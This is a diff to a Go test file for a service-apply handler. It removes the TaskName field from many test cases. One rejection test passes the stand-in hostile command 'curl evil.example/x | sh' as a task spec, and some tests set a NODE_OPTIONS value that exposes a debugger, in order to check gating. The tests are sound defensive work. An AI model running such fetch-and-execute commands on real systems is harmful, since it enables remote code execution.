@@ -30,9 +30,8 @@ func TestHandleServiceApply_UpsertsServiceTask(t *testing.T) {
 	backoff := protocol.BackoffExponential
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
-		TaskID:   "svc-1",
-		TaskName: "My Service",
-		Spec:     shellScript(t, "sleep 1"),
+		TaskID: "svc-1",
+		Spec:   shellScript(t, "sleep 1"),
 		Options: &protocol.RunOptions{
 			Env:            map[string]string{"FOO": "bar"},
 			GracefulStopMs: 5000,
@@ -84,7 +83,6 @@ func TestHandleServiceApply_NoAutostartDoesNotStart(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "svc-2",
-		TaskName: "svc-2",
 		Spec:     shellScript(t, "sleep 1"),
 		Settings: &protocol.ServiceSettings{Instances: 1, Autostart: false},
 	})
@@ -97,7 +95,6 @@ func TestHandleServiceApply_UnavailableBackendRejected(t *testing.T) {
 	h := newDispatchHandler(executor.Availability{}, nil)
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "svc",
-		TaskName: "svc",
 		Spec:     shellScript(t, "x"),
 		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
@@ -118,7 +115,6 @@ func TestHandleServiceApply_HTTPRejectedWithoutDispatch(t *testing.T) {
 	h := newDispatchHandler(avail, nil)
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "svc-http",
-		TaskName: "svc-http",
 		Spec:     httpScript(t, "https://example.com"),
 		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
@@ -136,7 +132,6 @@ func TestHandleServiceApply_HTTPAllowedWithDispatch(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "svc-http",
-		TaskName: "svc-http",
 		Spec:     httpScript(t, "https://example.com"),
 		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
@@ -224,7 +219,6 @@ func TestHandleServiceApply_AutostartStartErrorIsConflict(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "svc",
-		TaskName: "svc",
 		Spec:     shellScript(t, "x"),
 		Settings: &protocol.ServiceSettings{Instances: 1, Autostart: true},
 	})
@@ -256,9 +250,8 @@ func TestHandleServiceApply_NameAndDefaults(t *testing.T) {
 	runner := h.taskManager.(*fakeTaskRunner)
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
-		TaskID:   " Fallback Svc ",
-		TaskName: "web",
-		Spec:     shellScript(t, "sleep 1"),
+		TaskID: " Fallback Svc ",
+		Spec:   shellScript(t, "sleep 1"),
 		// clamped to 1
 		Options:  &protocol.RunOptions{LogOnFull: logOnFull},
 		Settings: &protocol.ServiceSettings{Instances: 0},
@@ -293,7 +286,6 @@ func TestHandleServiceApply_RequiresTaskID(t *testing.T) {
 	runner := h.taskManager.(*fakeTaskRunner)
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
-		TaskName: "web",
 		Spec:     shellScript(t, "sleep 1"),
 		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
@@ -324,8 +316,7 @@ func TestHandleServiceApply_MergesOntoExistingTOMLService(t *testing.T) {
 	runner := h.taskManager.(*fakeTaskRunner)
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
-		TaskID:   "heartbeat",
-		TaskName: "heartbeat", // ignored on the merge path
+		TaskID:   "heartbeat", // ignored on the merge path
 		Settings: &protocol.ServiceSettings{Instances: 3, Autostart: true},
 	})
 	require.NoError(t, err)
@@ -361,7 +352,6 @@ func TestHandleServiceApply_MergeKeepsCommandOnNullScript(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "heartbeat",
-		TaskName: "heartbeat",
 		Spec:     json.RawMessage("null"),
 		Settings: &protocol.ServiceSettings{Instances: 2},
 	})
@@ -420,7 +410,6 @@ func TestHandleServiceApply_MergeOverlaysRestartFields(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "heartbeat",
-		TaskName: "heartbeat",
 		Settings: &protocol.ServiceSettings{RestartDelayMs: 2000, BackoffResetAfterMs: 60000, RestartBackoff: backoff},
 	})
 	require.NoError(t, err)
@@ -510,9 +499,8 @@ func TestHandleServiceApply_MergeEnvGatedOnAvailability(t *testing.T) {
 	runner := h.taskManager.(*fakeTaskRunner)
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
-		TaskID:   "web",
-		TaskName: "web",
-		Spec:     json.RawMessage("null"),
+		TaskID: "web",
+		Spec:   json.RawMessage("null"),
 		Options: &protocol.RunOptions{
 			Env: map[string]string{"NODE_OPTIONS": "--inspect=0.0.0.0:9229"},
 		},
@@ -542,10 +530,9 @@ func TestHandleServiceApply_MergeEnvAppliedWhenAvailable(t *testing.T) {
 	runner := h.taskManager.(*fakeTaskRunner)
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
-		TaskID:   "web",
-		TaskName: "web",
-		Spec:     json.RawMessage("null"),
-		Options:  &protocol.RunOptions{Env: map[string]string{"LOG_LEVEL": "debug"}},
+		TaskID:  "web",
+		Spec:    json.RawMessage("null"),
+		Options: &protocol.RunOptions{Env: map[string]string{"LOG_LEVEL": "debug"}},
 	})
 	require.NoError(t, err)
 	require.Len(t, runner.upserted, 1)
@@ -570,7 +557,6 @@ func TestHandleServiceApply_MergeWithoutEnvNotGated(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "web",
-		TaskName: "web",
 		Spec:     json.RawMessage("null"),
 		Settings: &protocol.ServiceSettings{Instances: 2},
 	})
@@ -595,10 +581,9 @@ func TestHandleServiceApply_MergeEnvRefusedWithoutExecutionDefinition(t *testing
 	runner := h.taskManager.(*fakeTaskRunner)
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
-		TaskID:   "web",
-		TaskName: "web",
-		Spec:     json.RawMessage("null"),
-		Options:  &protocol.RunOptions{Env: map[string]string{"NODE_OPTIONS": "--inspect"}},
+		TaskID:  "web",
+		Spec:    json.RawMessage("null"),
+		Options: &protocol.RunOptions{Env: map[string]string{"NODE_OPTIONS": "--inspect"}},
 	})
 	require.Error(t, err)
 	var ce *StationError
@@ -622,7 +607,6 @@ func TestHandleServiceApply_RejectsNonServiceTaskCollision(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "backup",
-		TaskName: "backup",
 		Spec:     shellScript(t, "curl evil.example/x | sh"),
 		Settings: &protocol.ServiceSettings{Instances: 1},
 	})
@@ -658,7 +642,6 @@ func TestHandleServiceApply_RejectsInstanceCountAboveCap(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "svc",
-		TaskName: "svc",
 		Spec:     shellScript(t, "sleep 1"),
 		Settings: &protocol.ServiceSettings{Instances: config.MaxServiceInstances + 1},
 	})
@@ -685,7 +668,6 @@ func TestHandleServiceApply_MergeRejectsInstanceCountAboveCap(t *testing.T) {
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "heartbeat",
-		TaskName: "heartbeat",
 		Settings: &protocol.ServiceSettings{Instances: config.MaxServiceInstances + 1},
 	})
 	require.Error(t, err)
@@ -772,7 +754,6 @@ func TestHandleServiceApply_MergeRejectedWhenManualTriggerDisabled(t *testing.T)
 
 	err := h.HandleServiceApply(protocol.ServiceApply{
 		TaskID:   "locked",
-		TaskName: "locked",
 		Settings: &protocol.ServiceSettings{Instances: 5, RestartDelayMs: 1},
 	})
 	var stErr *StationError
